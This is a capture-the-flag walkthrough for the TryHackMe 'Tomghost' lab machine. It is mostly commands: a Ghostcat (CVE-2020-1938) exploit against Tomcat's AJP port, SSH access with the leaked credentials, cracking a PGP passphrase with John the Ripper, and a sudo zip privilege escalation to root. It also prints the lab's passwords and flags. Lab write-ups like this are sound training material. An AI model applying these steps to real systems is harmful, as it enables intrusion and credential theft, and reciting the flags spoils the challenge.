TOMGHOST

So we start with nmap in order to scan the ports

	nmap -sV 10.10.37.191

the port open that it seems to be interesting is:
	8080 -> dashboard tomcat to configure it
	8009 -> server web 

Googling the name of the machine so "TOMGHOST" it will be appear a CVE, more speficic the CVE-2020-1938 and there is
a on github a specific explanation of this CVE and how to exploit, so we must copy the repo:

	git clone https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat.git

We run the script:

        python3 CVE-2020-1938.py 10.10.37.191 -p 8009

	(N.B the script has two errors in the source code, at line 261 that we should delete the "buffer = 0" and the other one in the final line, we must cast to string "d.data")

from the script we receive some credentials for the SSH:

	skyfuck:8730281lkjlkjdqlksalks 

we connect with pwncat to ssh: (if you haven't run sudo pip3 install pwncat-cs)

	python3 -m pwncat
	connect ssh://skyfuck:8730281lkjlkjdqlksalks@10.10.37.191:22
	
there are two interesting file, the first one credential.pgp(the crypted file) and tryhackme.asc (the key), we must download it from pwncat to our machine with the following command:

	download credential.pgp /home/alessandro/Desktop/tryhackme/tomghost/credentials
	download tryhackme.asc /home/alessandro/Desktop/tryhackme/tomghost/file

now with the gpg we try to decrypt the file but there is a passphrase so we must take the hash from the "file" also called tryhackme.asc

	gpg2john file > file.hash
	john file.hash  --wordlist=/usr/share/wordlists/rockyou.txt --> the passphrase will be "alexandru"

we continue with gpg, we import the key and then we decrypt the credentials:

	gpg --import file
	gpg -d credentials --> merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

open another shell, connect with pwncat but this time with the merlin's credentials:

	connect ssh://merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j@10.10.37.191:22

there will be the first flag from user.txt:

	THM{GhostCat_1s_so_cr4sy}

now it's time to do priviliege escalation, by running the command "sudo -l", something very helpful appear:

	User merlin may run the following commands on ubuntu:
        (root : root) NOPASSWD: /usr/bin/zip

merlin can execute the binary file /usr/bin/zip so we search on google "sudo zip exploit" and run the following command:

	TF=$(mktemp -u)
	sudo zip $TF /etc/hosts -T -TT 'sh #'
	sudo rm $TF

we're rooot so:

	cd /root
	cat flag.txt --> "THM{Z1P_1S_FAKE}"

Written by: Alessandro Eleuteri and Alessandro Lupini.
	
